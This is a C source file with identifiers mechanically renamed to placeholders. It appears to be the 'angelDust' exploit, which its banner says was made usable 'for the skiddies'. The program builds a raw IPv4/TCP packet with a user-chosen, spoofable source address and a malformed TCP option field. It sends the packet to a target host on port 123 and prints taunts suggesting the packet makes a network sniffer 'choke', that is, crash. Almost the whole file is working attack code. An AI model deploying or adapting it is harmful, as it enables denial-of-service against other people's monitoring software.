
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_6__ TYPE_3__ ;
typedef struct TYPE_5__ TYPE_2__ ;
typedef struct TYPE_4__ TYPE_1__ ;


struct tcphdr {int doff; int window; scalar_t__ urg_ptr; scalar_t__ check; scalar_t__ syn; scalar_t__ res1; scalar_t__ ack; scalar_t__ seq; void* dest; void* source; } ;
struct TYPE_5__ {void* s_addr; } ;
struct sockaddr_in {void* sin_port; TYPE_2__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct option {char* member_0; int member_1; char member_3; int * member_2; } ;
struct TYPE_6__ {void* s_addr; } ;
struct TYPE_4__ {void* s_addr; } ;
struct ip {int ip_hl; int ip_v; int ip_ttl; int ip_len; TYPE_3__ ip_src; TYPE_1__ ip_dst; scalar_t__ ip_sum; int ip_p; scalar_t__ ip_off; scalar_t__ ip_id; scalar_t__ ip_tos; } ;
typedef int opts ;
typedef int datagram ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int FUNC_0 (int) ;
 int FUNC_1 (int) ;
 int FUNC_2 (int ,char*) ;
 int FUNC_3 (int,char**,char const* const,struct option const*,int *) ;
 void* FUNC_4 (int) ;
 void* FUNC_5 (char*) ;
 int FUNC_6 (char*,char*,int) ;
 int FUNC_7 (char**,int ,int) ;
 char* VAR_5 ;
 int FUNC_8 (char*) ;
 int FUNC_9 () ;
 int FUNC_10 (char*) ;
 int FUNC_11 (int,char*,int,int ,struct sockaddr*,int) ;
 int FUNC_12 (int) ;
 int FUNC_13 (int ,int ,int ) ;
 int VAR_6 ;
 int FUNC_14 (char*,char*,int) ;
 int * FUNC_15 (char*,char*) ;

int FUNC_16(int VAR_7, char **VAR_8)
{
int VAR_9;
int VAR_10;
const char* const VAR_11="hD:S:";


char VAR_12[] = "\x06\00\xff\xff";

char VAR_13[64];
struct sockaddr_in VAR_14;
struct ip *VAR_15 = (struct ip *) VAR_13;
struct tcphdr *VAR_16;
char VAR_17[16];
char VAR_18[16];
if(VAR_7 < 2)
{
FUNC_10("angelDust by Antimatt3r\n");
FUNC_10("pr0ps to Marcin for finding this bug\n");
FUNC_10("pr0ps to me for making something useful out of it for the skiddies\n");
FUNC_1(-1);
}


const struct option VAR_19[]=
{
{"help", 0, ((void*)0),'h'},
{"destination_ip",1,((void*)0),'D'},
{"source_ip",1,((void*)0),'S'},
};

FUNC_14(VAR_17,"127.0.0.1",16);
FUNC_14(VAR_18,"127.0.0.1",16);

do
{
VAR_10 = FUNC_3(VAR_7,VAR_8,VAR_11,VAR_19,((void*)0));
switch( VAR_10)
{
case 'h' :
FUNC_9();
return 0;
case 'D' :
FUNC_14(VAR_17,VAR_5,16);
break;
case 'S' :
FUNC_14(VAR_18,VAR_5,16);
break;

}
}
while(VAR_10 != -1) ;


FUNC_7(&VAR_13, 0, sizeof(VAR_13));
VAR_14.sin_addr.s_addr = FUNC_5(VAR_17);
VAR_14.sin_port = FUNC_4(123);
VAR_14.sin_family = VAR_0;

VAR_15->ip_hl = 5;
VAR_15->ip_v = 4;
VAR_15->ip_tos = 0;
VAR_15->ip_id = 0;
VAR_15->ip_off = 0;
VAR_15->ip_ttl = 64;
VAR_15->ip_p = VAR_2;
VAR_15->ip_len = 44;
VAR_15->ip_sum = 0;
VAR_15->ip_dst.s_addr = VAR_14.sin_addr.s_addr;
VAR_15->ip_src.s_addr = FUNC_5(VAR_18);

VAR_16 = (struct tcphdr *) (VAR_13 + (VAR_15->ip_hl << 2));
VAR_16->source = FUNC_4(321);
VAR_16->dest = VAR_14.sin_port;
VAR_16->seq = 0;
VAR_16->ack = 0;
VAR_16->res1 = 0;
VAR_16->doff = 6;
VAR_16->syn = 0;
VAR_16->window = 0x1000;
VAR_16->check = 0;
VAR_16->urg_ptr = 0;

FUNC_6(VAR_13 + 40, VAR_12, sizeof(VAR_12));

if ((VAR_9 = FUNC_13(VAR_3, VAR_4, VAR_1)) == -1) {
FUNC_8("socket");
FUNC_1(0);
}

if (FUNC_11(VAR_9, VAR_13, VAR_15->ip_len, 0, (struct sockaddr *) &VAR_14,
sizeof(struct sockaddr_in)) == -1) {
FUNC_8("sendto");
FUNC_1(-1);
}
FUNC_2(VAR_6,"Sniff this\n");
FUNC_2(VAR_6,"..............//");
FUNC_12(1);
FUNC_2(VAR_6,"\b\b\b\b// ");
FUNC_12(1);
FUNC_2(VAR_6,"\b\b\b\b\b\b// ");
FUNC_12(1);
FUNC_2(VAR_6,"\b\b\b\b\b\b\b\b// ");
FUNC_12(1);
FUNC_2(VAR_6,"\b\b\b\b\b\b\b\b\b\b// ");
FUNC_12(1);
FUNC_2(VAR_6,"\b\b\b\b\b\b\b\b\b\b\b\b// \n");
FUNC_10("and choke!\n");

FUNC_0(VAR_9);
return 0;
}
